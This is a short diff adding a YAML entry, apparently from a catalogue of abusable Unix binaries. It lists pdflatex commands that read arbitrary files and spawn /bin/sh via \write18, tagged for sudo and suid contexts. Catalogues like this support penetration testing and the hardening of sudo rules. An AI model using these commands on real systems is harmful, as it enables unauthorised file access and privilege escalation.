@@ -1,0 +1,21 @@
+---
+functions:
+  file-read:
+  - code: |-
+      pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+      pdftotext texput.pdf -
+    comment: |-
+      The read file will be part of the PDF output.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
